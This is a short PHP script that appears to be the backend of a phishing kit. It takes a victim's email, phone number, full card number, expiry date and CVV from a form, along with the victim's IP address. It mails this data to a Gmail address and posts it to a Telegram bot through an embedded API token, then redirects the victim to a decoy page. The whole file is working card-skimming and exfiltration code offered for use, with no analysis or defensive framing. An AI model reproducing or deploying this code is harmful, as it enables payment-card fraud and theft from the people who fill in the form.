<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index3.html";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Login ~~~~~~\n";
$message .= "email              : ".$_POST['eml']."\n";
$message .= "tel              : ".$_POST['numero']."\n";
$message .= "card            : ".$_POST['x1']." ";
$message .= "".$_POST['x2']." ";
$message .= "".$_POST['x3']." ";
$message .= "".$_POST['x4']."\n";
$message .= "date dexperation            : ".$_POST['moi']."\n";
$message .= "           : ".$_POST['ANN']."\n";
$message .= "CVV              : ".$_POST['cvv']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "~~~~~~~ CVV ~~~~~~~\n";
$send = "rzltktb@gmail.com";
$subject = "CVV PST | $ip ";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
$website="https://api.telegram.org/bot1295656696:AAG7aFrziYvQDE0B41Js07zH8g5krsGGPoM";
$chatId=1234567;  //Receiver Chat Id 
$params=[
    'chat_id'=>'672841277',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
$file = fopen("","a");
fwrite($file,$message); 
header("Location: $back");
?>